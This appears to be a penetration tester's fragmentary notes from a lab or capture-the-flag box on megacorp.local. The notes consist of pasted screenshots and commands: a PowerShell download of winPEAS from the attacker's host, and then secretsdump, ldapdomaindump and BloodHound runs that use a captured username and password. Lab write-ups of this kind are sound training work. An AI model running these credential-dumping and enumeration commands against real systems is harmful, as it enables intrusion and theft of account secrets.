
![[Pasted image 20240924041011.png]]

![[Pasted image 20240924041046.png]]

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```
![[Pasted image 20240924042731.png]]

I think some kind of antivirus is running behind
![[Pasted image 20240924043719.png]]

Now there are 2 ways either to try 
ldap
secrets dump
bloodhound
and see what we get so that we can escalate 


Secrets Dump
```
secretsdump.py holo.live/tushikikatomo:'finance1'@10.10.10.179
```

Ldap
```
ldapdomaindump ldaps://10.10.10.179 -u 'megacorp.local\tushikikatomo' -p 'finance1'
```
![[Pasted image 20240924141609.png]]

Bloodhound
```
bloodhound-python -d megacorp.local -u tushikikatomo -p 'finance1' -ns 10.10.10.179  -c all
```



